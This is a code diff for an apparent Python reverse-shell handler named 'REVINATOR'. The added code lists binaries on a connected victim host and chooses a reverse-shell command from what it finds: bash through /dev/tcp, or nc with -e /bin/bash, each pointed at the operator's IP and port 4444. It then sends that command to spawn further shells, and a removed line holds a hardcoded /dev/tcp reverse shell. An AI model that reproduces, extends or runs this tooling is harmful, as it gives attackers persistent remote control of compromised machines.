@@ -12,6 +12,7 @@ PORT = 4444
 s = None
 
 
+new_rev = {}
 
 
 class connection:
@@ -23,12 +24,59 @@ class connection:
         self.out_file = f"{self.addr}/out"
         self.sock = socket.socket()
         self.connected = False
+        self.record = True
+        self.recorded = ""
+        self.rev = ""
+        self.cmd = False
+        global PORT, IP, new_rev
+        if self.addr not in new_rev:
+            self.set_rev()
+
+
+    def rcv_stream(self):
+        self.recorded = ""
+        self.cmd = True
+        while self.cmd:
+            self.recorded += self.conn.recv(1024).decode()
+
+    def send_rcv(self, cmd):
+        cmd += "; echo REVINATOR_COMPLETE\r"
+        self.conn.send(cmd.encode())
+
+        threading.Thread(target=self.rcv_stream).start()
+        while self.recorded.count("REVINATOR_COMPLETE") < 2:
+            time.sleep(0.1)
+
+        self.cmd = False
+        return self.recorded
+
+    def set_rev(self):
+        global new_rev
+        self.send_rcv("find /bin/ /usr/bin/")
+
+        if "\n/usr/bin/bash" in self.recorded:
+            self.rev = f"/usr/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 &\r"
+
+        if "\n/bin/bash" in self.recorded:
+            self.rev = f"/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 &\r"
+
+        if "\n/bin/nc" in self.recorded:
+            self.rev = f"/bin/nc {IP} {PORT} -e /bin/bash & \r"
+
+        if "\n/usr/bin/nc" in self.recorded:
+            self.rev = f"/usr/bin/nc {IP} {PORT} -e /bin/bash & \r"
+
+
+        new_rev[self.addr] = self.rev
+        self.record = False
 
 
     def create_new(self):
-        global PORT, IP
-        self.conn.send(f"nc {IP} {PORT} -e /bin/bash & \r".encode())
-        #self.conn.send(b"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &\r")
+        
+        global PORT, IP, new_rev
+        if self.addr not in new_rev:
+            self.set_rev()
+        self.conn.send(self.rev.encode())
 
     def connect(self, sock):
         self.sock = sock[0]
@@ -50,7 +98,6 @@ class connection:
             data = self.sock.recv(1024)
             if data:
                 self.conn.sendall(data)
-
     
 
 
